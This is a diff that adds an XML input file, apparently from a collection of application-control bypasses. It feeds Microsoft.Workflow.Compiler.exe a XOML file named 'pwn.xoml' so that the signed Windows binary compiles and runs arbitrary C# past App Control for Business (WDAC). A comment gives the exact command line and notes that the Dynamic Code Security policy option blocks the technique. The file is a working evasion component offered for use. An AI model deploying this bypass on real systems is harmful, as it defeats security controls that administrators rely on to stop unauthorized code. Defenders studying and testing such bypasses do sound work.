@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  App Control for Business (WDAC) Bypass via Microsoft.Workflow.Compiler
+
+  This technique uses a signed Windows binary that supports execution of
+  arbitrary code. Microsoft.Workflow.Compiler compiles C# code supplied
+  through a XOML file referenced in this input XML.
+
+  This bypass is prevented when the Dynamic Code Security option is
+  enabled in the App Control policy.
+
+  Usage:
+    C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe test.xml output.xml
+-->
+<CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance"
+               xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler">
+    <files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
+        <d2p1:string>pwn.xoml</d2p1:string>
+    </files>
+    <parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">
+        <assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays"
+                       xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
+    </parameters>
+</CompilerInput>
